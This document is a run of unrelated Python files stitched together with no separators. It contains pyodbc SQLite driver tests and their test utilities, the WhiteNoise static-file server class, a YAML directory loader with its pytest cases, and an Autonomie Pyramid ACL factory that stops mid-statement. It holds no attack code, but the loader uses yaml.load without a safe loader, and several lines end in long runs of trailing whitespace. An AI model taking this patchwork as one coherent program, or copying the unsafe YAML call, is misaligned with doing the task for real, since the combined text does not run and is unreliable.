            self._test_strtype('text', value, len(value))
        return t
    for value in STR_FENCEPOSTS:
        locals()['test_text_%s' % len(value)] = _maketest(value)

    def test_text_upperlatin(self):
        self._test_strtype('varchar', '')

    #
    # blob
    #

    def test_null_blob(self):
        self._test_strtype('blob', None, 100)
     
    def test_large_null_blob(self):
        # Bug 1575064
        self._test_strtype('blob', None, 4000)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('blob', value, len(value))
        return t
    for value in BYTE_FENCEPOSTS:
        locals()['test_blob_%s' % len(value)] = _maketest(value)

    def test_subquery_params(self):
        """Ensure parameter markers work in a subquery"""
        self.cursor.execute("create table t1(id integer, s varchar(20))")
        self.cursor.execute("insert into t1 values (?,?)", 1, 'test')
        row = self.cursor.execute("""
                                  select x.id
                                  from (
                                    select id
                                    from t1
                                    where s = ?
                                      and id between ? and ?
                                   ) x
                                   """, 'test', 1, 10).fetchone()
        self.assertNotEqual(row, None)
        self.assertEqual(row[0], 1)

    def _exec(self):
        self.cursor.execute(self.sql)
        
    def test_close_cnxn(self):
        """Make sure using a Cursor after closing its connection doesn't crash."""

        self.cursor.execute("create table t1(id integer, s varchar(20))")
        self.cursor.execute("insert into t1 values (?,?)", 1, 'test')
        self.cursor.execute("select * from t1")

        self.cnxn.close()
        
        # Now that the connection is closed, we expect an exception.  (If the code attempts to use
        # the HSTMT, we'll get an access violation instead.)
        self.sql = "select * from t1"
        self.assertRaises(pyodbc.ProgrammingError, self._exec)

    def test_negative_row_index(self):
        self.cursor.execute("create table t1(s varchar(20))")
        self.cursor.execute("insert into t1 values(?)", "1")
        row = self.cursor.execute("select * from t1").fetchone()
        self.assertEqual(row[0], "1")
        self.assertEqual(row[-1], "1")

    def test_version(self):
        self.assertEqual(3, len(pyodbc.version.split('.'))) # 1.3.1 etc.

    #
    # ints and floats
    #

    def test_int(self):
        value = 1234
        self.cursor.execute("create table t1(n int)")
        self.cursor.execute("insert into t1 values (?)", value)
        result = self.cursor.execute("select n from t1").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_int(self):
        value = -1
        self.cursor.execute("create table t1(n int)")
        self.cursor.execute("insert into t1 values (?)", value)
        result = self.cursor.execute("select n from t1").fetchone()[0]
        self.assertEqual(result, value)

    def test_bigint(self):
        input = 3000000000
        self.cursor.execute("create table t1(d bigint)")
        self.cursor.execute("insert into t1 values (?)", input)
        result = self.cursor.execute("select d from t1").fetchone()[0]
        self.assertEqual(result, input)

    def test_negative_bigint(self):
        # Issue 186: BIGINT problem on 32-bit architeture
        input = -430000000
        self.cursor.execute("create table t1(d bigint)")
        self.cursor.execute("insert into t1 values (?)", input)
        result = self.cursor.execute("select d from t1").fetchone()[0]
        self.assertEqual(result, input)

    def test_float(self):
        value = 1234.567
        self.cursor.execute("create table t1(n float)")
        self.cursor.execute("insert into t1 values (?)", value)
        result = self.cursor.execute("select n from t1").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_float(self):
        value = -200
        self.cursor.execute("create table t1(n float)")
        self.cursor.execute("insert into t1 values (?)", value)
        result  = self.cursor.execute("select n from t1").fetchone()[0]
        self.assertEqual(value, result)

    #
    # rowcount
    #

    # Note: SQLRowCount does not define what the driver must return after a select statement
    # and says that its value should not be relied upon.  The sqliteodbc driver is hardcoded to
    # return 0 so I've deleted the test.

    def test_rowcount_delete(self):
        self.assertEqual(self.cursor.rowcount, -1)
        self.cursor.execute("create table t1(i int)")
        count = 4
        for i in range(count):
            self.cursor.execute("insert into t1 values (?)", i)
        self.cursor.execute("delete from t1")
        self.assertEqual(self.cursor.rowcount, count)

    def test_rowcount_nodata(self):
        """
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.  On the other hand, we could hardcode a
        zero return value.
        """
        self.cursor.execute("create table t1(i int)")
        # This is a different code path internally.
        self.cursor.execute("delete from t1")
        self.assertEqual(self.cursor.rowcount, 0)

    # In the 2.0.x branch, Cursor.execute sometimes returned the cursor and sometimes the rowcount.  This proved very
    # confusing when things went wrong and added very little value even when things went right since users could always
    # use: cursor.execute("...").rowcount

    def test_retcursor_delete(self):
        self.cursor.execute("create table t1(i int)")
        self.cursor.execute("insert into t1 values (1)")
        v = self.cursor.execute("delete from t1")
        self.assertEqual(v, self.cursor)

    def test_retcursor_nodata(self):
        """
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.
        """
        self.cursor.execute("create table t1(i int)")
        # This is a different code path internally.
        v = self.cursor.execute("delete from t1")
        self.assertEqual(v, self.cursor)

    def test_retcursor_select(self):
        self.cursor.execute("create table t1(i int)")
        self.cursor.execute("insert into t1 values (1)")
        v = self.cursor.execute("select * from t1")
        self.assertEqual(v, self.cursor)

    #
    # misc
    #

    def test_lower_case(self):
        "Ensure pyodbc.lowercase forces returned column names to lowercase."

        # Has to be set before creating the cursor, so we must recreate self.cursor.

        pyodbc.lowercase = True
        self.cursor = self.cnxn.cursor()

        self.cursor.execute("create table t1(Abc int, dEf int)")
        self.cursor.execute("select * from t1")

        names = [ t[0] for t in self.cursor.description ]
        names.sort()

        self.assertEqual(names, [ "abc", "def" ])

        # Put it back so other tests don't fail.
        pyodbc.lowercase = False
        
    def test_row_description(self):
        """
        Ensure Cursor.description is accessible as Row.cursor_description.
        """
        self.cursor = self.cnxn.cursor()
        self.cursor.execute("create table t1(a int, b char(3))")
        self.cnxn.commit()
        self.cursor.execute("insert into t1 values(1, 'abc')")

        row = self.cursor.execute("select * from t1").fetchone()

        self.assertEqual(self.cursor.description, row.cursor_description)
        

    def test_executemany(self):
        self.cursor.execute("create table t1(a int, b varchar(10))")

        params = [ (i, str(i)) for i in range(1, 6) ]

        self.cursor.executemany("insert into t1(a, b) values (?,?)", params)

        count = self.cursor.execute("select count(*) from t1").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute("select a, b from t1 order by a")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])


    def test_executemany_one(self):
        "Pass executemany a single sequence"
        self.cursor.execute("create table t1(a int, b varchar(10))")

        params = [ (1, "test") ]

        self.cursor.executemany("insert into t1(a, b) values (?,?)", params)

        count = self.cursor.execute("select count(*) from t1").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute("select a, b from t1 order by a")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])
        

    def test_executemany_failure(self):
        """
        Ensure that an exception is raised if one query in an executemany fails.
        """
        self.cursor.execute("create table t1(a int, b varchar(10))")

        params = [ (1, 'good'),
                   ('error', 'not an int'),
                   (3, 'good') ]
        
        self.assertRaises(pyodbc.Error, self.cursor.executemany, "insert into t1(a, b) value (?, ?)", params)

        
    def test_row_slicing(self):
        self.cursor.execute("create table t1(a int, b int, c int, d int)");
        self.cursor.execute("insert into t1 values(1,2,3,4)")

        row = self.cursor.execute("select * from t1").fetchone()

        result = row[:]
        self.assertTrue(result is row)

        result = row[:-1]
        self.assertEqual(result, (1,2,3))

        result = row[0:4]
        self.assertTrue(result is row)


    def test_row_repr(self):
        self.cursor.execute("create table t1(a int, b int, c int, d int)");
        self.cursor.execute("insert into t1 values(1,2,3,4)")

        row = self.cursor.execute("select * from t1").fetchone()

        result = str(row)
        self.assertEqual(result, "(1, 2, 3, 4)")

        result = str(row[:-1])
        self.assertEqual(result, "(1, 2, 3)")

        result = str(row[:1])
        self.assertEqual(result, "(1,)")


    def test_view_select(self):
        # Reported in forum: Can't select from a view?  I think I do this a lot, but another test never hurts.

        # Create a table (t1) with 3 rows and a view (t2) into it.
        self.cursor.execute("create table t1(c1 int identity(1, 1), c2 varchar(50))")
        for i in range(3):
            self.cursor.execute("insert into t1(c2) values (?)", "string%s" % i)
        self.cursor.execute("create view t2 as select * from t1")

        # Select from the view
        self.cursor.execute("select * from t2")
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(len(rows) == 3)

    def test_autocommit(self):
        self.assertEqual(self.cnxn.autocommit, False)

        othercnxn = pyodbc.connect(self.connection_string, autocommit=True)
        self.assertEqual(othercnxn.autocommit, True)

        othercnxn.autocommit = False
        self.assertEqual(othercnxn.autocommit, False)

    def test_skip(self):
        # Insert 1, 2, and 3.  Fetch 1, skip 2, fetch 3.

        self.cursor.execute("create table t1(id int)");
        for i in range(1, 5):
            self.cursor.execute("insert into t1 values(?)", i)
        self.cursor.execute("select id from t1 order by id")
        self.assertEqual(self.cursor.fetchone()[0], 1)
        self.cursor.skip(2)
        self.assertEqual(self.cursor.fetchone()[0], 4)

    def test_sets_execute(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute("create table t1 (word varchar (100))")
            words = set (['a'])
            self.cursor.execute("insert into t1 (word) VALUES (?)", [words])

        self.assertRaises(pyodbc.ProgrammingError, f)

    def test_sets_executemany(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute("create table t1 (word varchar (100))")
            words = set (['a'])
            self.cursor.executemany("insert into t1 (word) values (?)", [words])
            
        self.assertRaises(TypeError, f)

    def test_row_execute(self):
        "Ensure we can use a Row object as a parameter to execute"
        self.cursor.execute("create table t1(n int, s varchar(10))")
        self.cursor.execute("insert into t1 values (1, 'a')")
        row = self.cursor.execute("select n, s from t1").fetchone()
        self.assertNotEqual(row, None)

        self.cursor.execute("create table t2(n int, s varchar(10))")
        self.cursor.execute("insert into t2 values (?, ?)", row)
        
    def test_row_executemany(self):
        "Ensure we can use a Row object as a parameter to executemany"
        self.cursor.execute("create table t1(n int, s varchar(10))")

        for i in range(3):
            self.cursor.execute("insert into t1 values (?, ?)", i, chr(ord('a')+i))

        rows = self.cursor.execute("select n, s from t1").fetchall()
        self.assertNotEqual(len(rows), 0)

        self.cursor.execute("create table t2(n int, s varchar(10))")
        self.cursor.executemany("insert into t2 values (?, ?)", rows)
        
    def test_description(self):
        "Ensure cursor.description is correct"

        self.cursor.execute("create table t1(n int, s text)")
        self.cursor.execute("insert into t1 values (1, 'abc')")
        self.cursor.execute("select * from t1")

        # (I'm not sure the precision of an int is constant across different versions, bits, so I'm hand checking the
        # items I do know.

        # int
        t = self.cursor.description[0]
        self.assertEqual(t[0], 'n')
        self.assertEqual(t[1], int)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # text
        t = self.cursor.description[1]
        self.assertEqual(t[0], 's')
        self.assertEqual(t[1], str)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

    def test_row_equal(self):
        self.cursor.execute("create table t1(n int, s varchar(20))")
        self.cursor.execute("insert into t1 values (1, 'test')")
        row1 = self.cursor.execute("select n, s from t1").fetchone()
        row2 = self.cursor.execute("select n, s from t1").fetchone()
        b = (row1 == row2)
        self.assertEqual(b, True)

    def test_row_gtlt(self):
        self.cursor.execute("create table t1(n int, s varchar(20))")
        self.cursor.execute("insert into t1 values (1, 'test1')")
        self.cursor.execute("insert into t1 values (1, 'test2')")
        rows = self.cursor.execute("select n, s from t1 order by s").fetchall()
        self.assertTrue(rows[0] < rows[1])
        self.assertTrue(rows[0] <= rows[1])
        self.assertTrue(rows[1] > rows[0])
        self.assertTrue(rows[1] >= rows[0])
        self.assertTrue(rows[0] != rows[1])

        rows = list(rows)
        rows.sort() # uses <
        
    def _test_context_manager(self):
        # TODO: This is failing, but it may be due to the design of sqlite.  I've disabled it
        # for now until I can research it some more.

        # WARNING: This isn't working right now.  We've set the driver's autocommit to "off",
        # but that doesn't automatically start a transaction.  I'm not familiar enough with the
        # internals of the driver to tell what is going on, but it looks like there is support
        # for the autocommit flag.
        #
        # I thought it might be a timing issue, like it not actually starting a txn until you
        # try to do something, but that doesn't seem to work either.  I'll leave this in to
        # remind us that it isn't working yet but we need to contact the SQLite ODBC driver
        # author for some guidance.

        with pyodbc.connect(self.connection_string) as cnxn:
            cursor = cnxn.cursor()
            cursor.execute("begin")
            cursor.execute("create table t1(i int)")
            cursor.execute('rollback')

        # The connection should be closed now.
        def test():
            cnxn.execute('rollback')
        self.assertRaises(pyodbc.Error, test)

    def test_untyped_none(self):
        # From issue 129
        value = self.cursor.execute("select ?", None).fetchone()[0]
        self.assertEqual(value, None)
        
    def test_large_update_nodata(self):
        self.cursor.execute('create table t1(a blob)')
        hundredkb = 'x'*100*1024
        self.cursor.execute('update t1 set a=? where 1=0', (hundredkb,))

    def test_no_fetch(self):
        # Issue 89 with FreeTDS: Multiple selects (or catalog functions that issue selects) without fetches seem to
        # confuse the driver.
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')


def main():
    from optparse import OptionParser
    parser = OptionParser(usage=usage)
    parser.add_option("-v", "--verbose", default=0, action="count", help="Increment test verbosity (can be used multiple times)")
    parser.add_option("-d", "--debug", action="store_true", default=False, help="Print debugging items")
    parser.add_option("-t", "--test", help="Run only the named test")

    (options, args) = parser.parse_args()

    if len(args) > 1:
        parser.error('Only one argument is allowed.  Do you need quotes around the connection string?')

    if not args:
        connection_string = load_setup_connection_string('sqlitetests')

        if not connection_string:
            parser.print_help()
            raise SystemExit()
    else:
        connection_string = args[0]

    if options.verbose:
        cnxn = pyodbc.connect(connection_string)
        print_library_info(cnxn)
        cnxn.close()

    suite = load_tests(SqliteTestCase, options.test, connection_string)

    testRunner = unittest.TextTestRunner(verbosity=options.verbose)
    result = testRunner.run(suite)

    sys.exit(result.errors and 1 or 0)


if __name__ == '__main__':

    # Add the build directory to the path so we're testing the latest build, not the installed version.

    add_to_path()

    import pyodbc
    main()

import os, sys, platform
from os.path import join, dirname, abspath, basename
import unittest

def add_to_path():
    """
    Prepends the build directory to the path so that newly built pyodbc libraries are used, allowing it to be tested
    without installing it.
    """
    # Put the build directory into the Python path so we pick up the version we just built.
    #
    # To make this cross platform, we'll search the directories until we find the .pyd file.

    import imp

    library_exts  = [ t[0] for t in imp.get_suffixes() if t[-1] == imp.C_EXTENSION ]
    library_names = [ 'pyodbc%s' % ext for ext in library_exts ]

    # Only go into directories that match our version number.

    dir_suffix = '-%s.%s' % (sys.version_info[0], sys.version_info[1])

    build = join(dirname(dirname(abspath(__file__))), 'build')

    for root, dirs, files in os.walk(build):
        for d in dirs[:]:
            if not d.endswith(dir_suffix):
                dirs.remove(d)

        for name in library_names:
            if name in files:
                sys.path.insert(0, root)
                return

    print('Did not find the pyodbc library in the build directory.  Will use an installed version.')


def print_library_info(cnxn):
    import pyodbc
    print('python:  %s' % sys.version)
    print('pyodbc:  %s %s' % (pyodbc.version, os.path.abspath(pyodbc.__file__)))
    print('odbc:    %s' % cnxn.getinfo(pyodbc.SQL_ODBC_VER))
    print('driver:  %s %s' % (cnxn.getinfo(pyodbc.SQL_DRIVER_NAME), cnxn.getinfo(pyodbc.SQL_DRIVER_VER)))
    print('         supports ODBC version %s' % cnxn.getinfo(pyodbc.SQL_DRIVER_ODBC_VER))
    print('os:      %s' % platform.system())
    print('unicode: Py_Unicode=%s SQLWCHAR=%s' % (pyodbc.UNICODE_SIZE, pyodbc.SQLWCHAR_SIZE))

    cursor = cnxn.cursor()
    for typename in ['VARCHAR', 'WVARCHAR', 'BINARY']:
        t = getattr(pyodbc, 'SQL_' + typename)
        cursor.getTypeInfo(t)
        row = cursor.fetchone()
        print('Max %s = %s' % (typename, row and row[2] or '(not supported)'))

    if platform.system() == 'Windows':
        print('         %s' % ' '.join([s for s in platform.win32_ver() if s]))



def load_tests(testclass, name, *args):
    """
    Returns a TestSuite for tests in `testclass`.

    name
      Optional test name if you only want to run 1 test.  If not provided all tests in `testclass` will be loaded.

    args
      Arguments for the test class constructor.  These will be passed after the test method name.
    """
    if name:
        if not name.startswith('test_'):
            name = 'test_%s' % name
        names = [ name ]

    else:
        names = [ method for method in dir(testclass) if method.startswith('test_') ]

    return unittest.TestSuite([ testclass(name, *args) for name in names ])


def load_setup_connection_string(section):
    """
    Attempts to read the default connection string from the setup.cfg file.

    If the file does not exist or if it exists but does not contain the connection string, None is returned.  If the
    file exists but cannot be parsed, an exception is raised.
    """
    from os.path import exists, join, dirname, splitext, basename
    from configparser import SafeConfigParser

    FILENAME = 'setup.cfg'
    KEY      = 'connection-string'

    path = join(dirname(dirname(abspath(__file__))), 'tmp', FILENAME)                    

    if exists(path):                    
        try:                    
            p = SafeConfigParser()                    
            p.read(path)                    
        except:                    
            raise SystemExit('Unable to parse %s: %s' % (path, sys.exc_info()[1]))                    

        if p.has_option(section, KEY):                    
            return p.get(section, KEY)                    

    return None                    

import os
from posixpath import normpath
import re
import warnings
from wsgiref.headers import Headers
from wsgiref.util import FileWrapper

from .media_types import MediaTypes
from .scantree import scantree
from .responders import StaticFile, MissingFileError, IsDirectoryError, Redirect
from .string_utils import (decode_if_byte_string, decode_path_info,
                           ensure_leading_trailing_slash)


class WhiteNoise(object):

    # Ten years is what nginx sets a max age if you use 'expires max;'
    # so we'll follow its lead
    FOREVER = 10*365*24*60*60

    # Attributes that can be set by keyword args in the constructor
    config_attrs = ('autorefresh', 'max_age', 'allow_all_origins', 'charset',
                    'mimetypes', 'add_headers_function', 'index_file',
                    'immutable_file_test')
    # Re-check the filesystem on every request so that any changes are
    # automatically picked up. NOTE: For use in development only, not supported
    # in production
    autorefresh = False
    max_age = 60
    # Set 'Access-Control-Allow-Orign: *' header on all files.
    # As these are all public static files this is safe (See
    # http://www.w3.org/TR/cors/#security) and ensures that things (e.g
    # webfonts in Firefox) still work as expected when your static files are
    # served from a CDN, rather than your primary domain.
    allow_all_origins = True
    charset = 'utf-8'
    # Custom mime types
    mimetypes = None
    # Callback for adding custom logic when setting headers
    add_headers_function = None
    # Name of index file (None to disable index support)
    index_file = None

    def __init__(self, application, root=None, prefix=None, **kwargs):
        for attr in self.config_attrs:
            try:
                value = kwargs.pop(attr)
            except KeyError:
                pass
            else:
                value = decode_if_byte_string(value)
                setattr(self, attr, value)
        if kwargs:
            raise TypeError("Unexpected keyword argument '{0}'".format(
                list(kwargs.keys())[0]))
        self.media_types = MediaTypes(extra_types=self.mimetypes)
        self.application = application
        self.files = {}
        self.directories = []
        if self.index_file is True:
            self.index_file = 'index.html'
        if not callable(self.immutable_file_test):
            regex = re.compile(self.immutable_file_test)
            self.immutable_file_test = lambda path, url: bool(regex.search(url))
        if root is not None:
            self.add_files(root, prefix)

    def __call__(self, environ, start_response):
        path = decode_path_info(environ.get('PATH_INFO', ''))
        if self.autorefresh:
            static_file = self.find_file(path)
        else:
            static_file = self.files.get(path)
        if static_file is None:
            return self.application(environ, start_response)
        else:
            return self.serve(static_file, environ, start_response)

    @staticmethod
    def serve(static_file, environ, start_response):
        response = static_file.get_response(environ['REQUEST_METHOD'], environ)
        status_line = '{} {}'.format(response.status, response.status.phrase)
        start_response(status_line, list(response.headers))
        if response.file is not None:
            file_wrapper = environ.get('wsgi.file_wrapper', FileWrapper)
            return file_wrapper(response.file)
        else:
            return []

    def add_files(self, root, prefix=None):
        root = decode_if_byte_string(root, force_text=True)
        root = root.rstrip(os.path.sep) + os.path.sep
        prefix = decode_if_byte_string(prefix)
        prefix = ensure_leading_trailing_slash(prefix)
        if self.autorefresh:
            # Later calls to `add_files` overwrite earlier ones, hence we need
            # to store the list of directories in reverse order so later ones
            # match first when they're checked in "autorefresh" mode
            self.directories.insert(0, (root, prefix))
        else:
            if os.path.isdir(root):
                self.update_files_dictionary(root, prefix)
            else:
                warnings.warn(u'No directory at: {}'.format(root))

    def update_files_dictionary(self, root, prefix):
        # Build a mapping from paths to the results of `os.stat` calls
        # so we only have to touch the filesystem once
        stat_cache = dict(scantree(root))
        for path in stat_cache.keys():
            relative_path = path[len(root):]
            relative_url = relative_path.replace('\\', '/')
            url = prefix + relative_url
            self.add_file_to_dictionary(url, path, stat_cache=stat_cache)

    def add_file_to_dictionary(self, url, path, stat_cache=None):
        if self.is_compressed_variant(path, stat_cache=stat_cache):
            return
        if self.index_file and url.endswith('/' + self.index_file):
            index_url = url[:-len(self.index_file)]
            index_no_slash = index_url.rstrip('/')
            self.files[url] = self.redirect(url, index_url)
            self.files[index_no_slash] = self.redirect(index_no_slash, index_url)
            url = index_url
        static_file = self.get_static_file(path, url, stat_cache=stat_cache)
        self.files[url] = static_file

    def find_file(self, url):
        # Optimization: bail early if the URL can never match a file
        if not self.index_file and url.endswith('/'):
            return
        if not self.url_is_canonical(url):
            return
        for path in self.candidate_paths_for_url(url):
            try:
                return self.find_file_at_path(path, url)
            except MissingFileError:
                pass

    def candidate_paths_for_url(self, url):
        for root, prefix in self.directories:
            if url.startswith(prefix):
                yield os.path.join(root, url[len(prefix):])                    

    def find_file_at_path(self, path, url):
        if self.is_compressed_variant(path):
            raise MissingFileError(path)
        if self.index_file:
            return self.find_file_at_path_with_indexes(path, url)
        else:
            return self.get_static_file(path, url)

    def find_file_at_path_with_indexes(self, path, url):
        if url.endswith('/'):
            path = os.path.join(path, self.index_file)
            return self.get_static_file(path, url)
        elif url.endswith('/' + self.index_file):
            if os.path.isfile(path):
                return self.redirect(url, url[:-len(self.index_file)])
        else:
            try:
                return self.get_static_file(path, url)
            except IsDirectoryError:
                if os.path.isfile(os.path.join(path, self.index_file)):
                    return self.redirect(url, url + '/')
        raise MissingFileError(path)

    @staticmethod
    def url_is_canonical(url):
        """
        Check that the URL path does not contain any elements which might be                    
        used in a path traversal attack                    
        """
        if '\\' in url:
            return False
        normalised = normpath(url)
        if url.endswith('/') and url != '/':
            normalised += '/'
        return normalised == url

    @staticmethod
    def is_compressed_variant(path, stat_cache=None):
        if path[-3:] in ('.gz', '.br'):
            uncompressed_path = path[:-3]
            if stat_cache is None:
                return os.path.isfile(uncompressed_path)
            else:
                return uncompressed_path in stat_cache
        return False

    def get_static_file(self, path, url, stat_cache=None):
        # Optimization: bail early if file does not exist
        if stat_cache is None and not os.path.exists(path):
            raise MissingFileError(path)
        headers = Headers([])
        self.add_mime_headers(headers, path, url)
        self.add_cache_headers(headers, path, url)
        if self.allow_all_origins:
            headers['Access-Control-Allow-Origin'] = '*'
        if self.add_headers_function:
            self.add_headers_function(headers, path, url)
        return StaticFile(
                path, headers.items(),
                stat_cache=stat_cache,
                encodings={
                  'gzip': path + '.gz', 'br': path + '.br'})

    def add_mime_headers(self, headers, path, url):
        media_type = self.media_types.get_type(path)
        if (media_type.startswith('text/') or
                media_type == 'application/javascript'):
            params = {'charset': str(self.charset)}
        else:
            params = {}
        headers.add_header('Content-Type', str(media_type), **params)

    def add_cache_headers(self, headers, path, url):
        if self.immutable_file_test(path, url):
            headers['Cache-Control'] = \
                    'max-age={0}, public, immutable'.format(self.FOREVER)
        elif self.max_age is not None:
            headers['Cache-Control'] = \
                    'max-age={0}, public'.format(self.max_age)

    def immutable_file_test(self, path, url):
        """
        This should be implemented by sub-classes (see e.g. WhiteNoiseMiddleware)
        or by setting the `immutable_file_test` config option
        """
        return False

    def redirect(self, from_url, to_url):
        """
        Return a relative 302 redirect

        We use relative redirects as we don't know the absolute URL the app is
        being hosted under
        """
        if to_url == from_url + '/':
            relative_url = from_url.split('/')[-1] + '/'
        elif from_url == to_url + self.index_file:
            relative_url = './'
        else:
            raise ValueError(
                    'Cannot handle redirect: {} > {}'.format(from_url, to_url))
        if self.max_age is not None:
            headers = {
                'Cache-Control': 'max-age={0}, public'.format(self.max_age)}
        else:
            headers = {}
        return Redirect(relative_url, headers=headers)


#!/usr/bin/env python

import os
import os.path
import json
import sys
import yaml


def _load_yml_filedir(path):
    """
    Internal function. Do not use.
    Loads all YML-files from the given directory, recursively.
    This function excepts the path to exist.                    
    """
    YML_FILE_SUFFIX = '.yml'
    bpath = os.path.basename(path)

    if os.path.isdir(path):
        result = {}

        for entry in os.listdir(path):
            epath = os.path.join(path, entry)
            key, value = _load_yml_filedir(epath)

            if not key:
              continue

            result[key] = value

        return bpath, result
    elif os.path.isfile(path):
        if os.path.abspath(path) == os.path.abspath(sys.argv[0]):
            return None, None  # ignore script itself

        if path.endswith(YML_FILE_SUFFIX):
          bpath = bpath[:-len(YML_FILE_SUFFIX)]

          try:
              return bpath, yaml.load(open(path))
          except:
              return bpath, None
        else:
          return None, None



def load_yml_filedir(root_dir):
    """ load the given directory and return the data as a dict """
    if os.path.exists(root_dir):                    
        return _load_yml_filedir(root_dir)[1]                    
    else:
        return {}                    


def dump_yml_filedir(root_dir):
    """ load the given directory and print the data as formatted json """
    result = load_yml_filedir(root_dir)
    json.dump(result, sys.stdout, indent=2)


if __name__ == "__main__":
    root_dir = sys.argv[1] if len(sys.argv) > 1 else '.'
    dump_yml_filedir(root_dir)

import os.path

import pytest

import nestedfacts


@pytest.mark.parametrize("inputfile,expected", [
    ('single_file.yml', ['one', 'two', 'three!']),
    ('simple_dir', {'foo': 5, 'bar': 7}),
    ('nested_dir', {'foo': 5, 'bar': {'nesting': 'is awesome', 'or': ['is', 'it?']}}),
    ('invalid_file', {'foo': 42, 'invalid': None}),
    ('nonyaml_dir', {'foo': 43}),
    ('nonyaml_file', None),
    ('___doesnotexist', {}),                    
])
def test_single_file(inputfile, expected):
    data = nestedfacts.load_yml_filedir(os.path.join(os.path.dirname(__file__), 'data', inputfile))
    assert data == expected

# -*- coding: utf-8 -*-
# * Copyright (C) 2012-2013 Croissance Commune
# * Authors:
#       * Arezki Feth <f.a@majerti.fr>;
#       * Miotte Julien <j.m@majerti.fr>;
#       * Pettier Gabriel;
#       * TJEBBES Gaston <g.t@majerti.fr>
#
# This file is part of Autonomie : Progiciel de gestion de CAE.
#
#    Autonomie is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    Autonomie is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with Autonomie.  If not, see <http://www.gnu.org/licenses/>.
#

"""
    Root factory <=> Acl handling
"""
from pyramid.security import (
    Allow,
    Deny,
    Everyone,
    Authenticated,
    ALL_PERMISSIONS,
)
from sqlalchemy.orm import undefer_group

from autonomie.models.config import ConfigFiles
from autonomie.models.activity import Activity
from autonomie.models.company import Company
from autonomie.models.competence import (
    CompetenceGrid,
    CompetenceGridItem,
    CompetenceGridSubItem,
)
from autonomie.models.customer import Customer
from autonomie.models.files import (
    File,
    Template,
    TemplatingHistory,
)
from autonomie.models.project import (
    Project,
    Phase,
)
from autonomie.models.task.task import (
    TaskLine,
    TaskLineGroup,
    DiscountLine,
)
from autonomie.models.task.estimation import (
    PaymentLine,
)
from autonomie.models.task.estimation import Estimation
from autonomie.models.task.invoice import (
    Invoice,
    CancelInvoice,
    Payment,
)
from autonomie.models.workshop import (
    Workshop,
    Timeslot,
)
from autonomie.models.expense import (
    ExpenseSheet,
    ExpensePayment,
    ExpenseType,
    ExpenseKmType,
    ExpenseTelType,
)
from autonomie.models.user import (
    User,
    UserDatas,
)
from autonomie_celery.models import (
    Job,
)
from autonomie.models.statistics import (
    StatisticSheet,
    StatisticEntry,
    BaseStatisticCriterion,
)
from autonomie.models.sale_product import (
    SaleProduct,
    SaleProductGroup,
    SaleProductCategory,
)
from autonomie.models.tva import Tva


DEFAULT_PERM = [
    (Allow, "group:admin", ALL_PERMISSIONS, ),
    (Deny, "group:manager", ('admin',)),
    (Allow, "group:manager", ALL_PERMISSIONS, ),
    (Allow, "group:contractor", ('visit',), ),
]
DEFAULT_PERM_NEW = [
    (Allow, "group:admin", ('admin', 'manage', 'admin_treasury')),
    (Allow, "group:manager", ('manage', 'admin_treasury')),
]


class RootFactory(dict):
    """
       Ressource factory, returns the appropriate resource regarding
       the request object
    """
    __name__ = "root"

    @property
    def __acl__(self):
        """
            Default permissions
        """
        acl = DEFAULT_PERM[:]
        acl.append((Allow, Authenticated, 'view',))
        return acl

    def __init__(self, request):
        self.request = request

        for traversal_name, object_name, factory in (
            ("activities", "activity", Activity, ),
            ('cancelinvoices', 'cancelinvoice', CancelInvoice, ),
            ('companies', 'company', Company, ),
            ('competences', 'competence', CompetenceGrid, ),
            ('competence_items', 'competence_item', CompetenceGridItem, ),
            ('competence_subitems', 'competence_subitem',
             CompetenceGridSubItem, ),
            ('customers', 'customer', Customer, ),
            ('estimations', 'estimation', Estimation, ),
            ('expenses', 'expense', ExpenseSheet, ),
            (
                'expense_types_expenses',
                'expense_types_expense',
                ExpenseType
            ),
            (
                'expense_types_expensekms',
                'expense_types_expensekm',
                ExpenseKmType
            ),
            (
                'expense_types_expensetels',
                'expense_types_expensetel',
                ExpenseTelType
            ),
            ('expense_payments', 'expense_payment', ExpensePayment, ),
            ('files', 'file', File, ),
            ('invoices', 'invoice', Invoice, ),
            ('jobs', 'job', Job, ),
            ('payments', 'payment', Payment, ),
            ('phases', 'phase', Phase, ),
            ('projects', 'project', Project, ),
            ('sale_categories', 'sale_category', SaleProductCategory, ),
            ('sale_products', 'sale_product', SaleProduct, ),
            ('sale_product_groups', 'sale_product_group', SaleProductGroup, ),
            ('statistics', 'statistic', StatisticSheet,),
            ('statistic_entries', 'statistic_entry', StatisticEntry,),
            ('statistic_criteria', 'statistic_criterion',
             BaseStatisticCriterion,),
            ('task_line', 'task_line', TaskLine),                    
            ('task_line_group', 'task_line_group', TaskLineGroup),                    
            ('templates', 'template', Template, ),
